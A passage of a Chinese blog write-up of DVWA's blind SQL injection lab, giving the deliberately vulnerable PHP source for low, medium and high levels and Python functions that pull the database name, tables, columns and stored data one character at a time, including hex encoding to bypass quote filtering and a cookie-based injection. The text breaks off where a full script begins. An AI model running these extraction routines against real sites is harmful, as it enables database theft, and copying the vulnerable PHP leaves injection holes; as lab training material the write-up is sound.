python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.database = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">            self.database += <span class="string">'666'</span></span><br><span class="line">    <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\n can not get the database"</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGjklQ.png" alt="MGjklQ.png"></p><h3 id="获取表长"><a href="#获取表长" class="headerlink" title="获取表长"></a>获取表长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.table_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the table_length'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGjdfO.png" alt="MGjdfO.png"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">        self.table_name.append(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the table_name'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJie0g.png" alt="MJie0g.png"></p><h3 id="获取表列数量"><a href="#获取表列数量" class="headerlink" title="获取表列数量"></a>获取表列数量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    self.column_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.column_num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br></pre></td></tr></table></figure><h3 id="获取总长度"><a href="#获取总长度" class="headerlink" title="获取总长度"></a>获取总长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.column_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the column_length'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23"</span>.format(str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">        self.column_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the column_name'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJFlUH.png" alt="MJFlUH.png"></p><h3 id="获取字段数目"><a href="#获取字段数目" class="headerlink" title="获取字段数目"></a>获取字段数目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.word_num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the word_num'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取列长"><a href="#获取列长" class="headerlink" title="获取列长"></a>获取列长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.word_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the word length'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23"</span>.format(column_name,str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    self.word_name.append(name)</span><br><span class="line">    print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJAW4J.png" alt="MJAW4J.png"></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="SQL-Injection-Blind-Source-1"><a href="#SQL-Injection-Blind-Source-1" class="headerlink" title="SQL Injection (Blind) Source"></a>SQL Injection (Blind) Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $id ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。</p><p>由于他会过滤单引号，所以需要转成16进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tranhex</span><span class="params">(self,str1)</span>:</span></span><br><span class="line">       result = <span class="string">'0x'</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">           result += hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">       <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJmPQs.png" alt="MJmPQs.png"></p><p><img src="https://s2.ax1x.com/2019/11/13/MJmaSH.png" alt="MJmaSH.png"></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="SQL-Injection-Blind-Source-2"><a href="#SQL-Injection-Blind-Source-2" class="headerlink" title="SQL Injection (Blind) Source"></a>SQL Injection (Blind) Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>随便写个1提交</p><p><img src="https://s2.ax1x.com/2019/11/13/MJunM9.png" alt="MJunM9.png"></p><p> 是一个cookie注入 </p><p><img src="https://s2.ax1x.com/2019/11/13/MJuLLR.png" alt="MJuLLR.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_headers</span><span class="params">(self,payload)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">"id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c"</span>.format(payload)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MYZAMR.png" alt="MYZAMR.png"></p><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Injection <span class="keyword">import</span> Injection</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url)</span>:</span></span><br><span class="line">    Injection(url).run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id="</span></span><br><span class="line">    main(url</span><br></pre></td></tr></table></figure><h3 id="low"><a href="#low" class="headerlink" title="low:"></a>low:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span 